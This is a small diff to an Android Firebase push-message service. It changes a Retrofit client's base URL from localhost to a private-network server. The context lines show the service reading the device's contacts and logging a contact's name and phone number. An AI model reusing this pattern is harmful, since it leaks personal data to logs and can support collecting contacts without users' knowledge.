@@ -25,7 +25,7 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         List<Contact> lsContact = cc.GetContacts(this);
         Log.d(TAG,"Name : "+ lsContact.get(1).GetName()+" Number : " + lsContact.get(1).GetNumber());
         Retrofit retrofit = new Retrofit.Builder()
-                .baseUrl("http://localhost")
+                .baseUrl("http://10.8.111.192:5000")
                 .addConverterFactory(JacksonConverterFactory.create())
                 .build();
         RetrofitAPI retrofitAPI = retrofit.create(RetrofitAPI.class);
